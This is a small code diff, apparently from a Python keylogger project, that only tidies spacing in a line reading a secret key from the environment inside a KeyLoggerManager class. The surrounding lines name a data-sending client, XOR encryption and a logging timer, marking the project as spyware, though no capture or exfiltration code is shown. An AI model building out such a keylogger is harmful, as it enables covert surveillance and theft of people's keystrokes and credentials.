@@ -13,7 +13,7 @@ class KeyLoggerManager:
         self.send_client=SendData()
         self.TIME=10
         self.xor = EncryptedXor()
-        self.key = os.getenv( 'SECRET_KEY' )
+        self.key = os.getenv('SECRET_KEY')
 
     def start_to_program(self):
         self.start.start_logging()
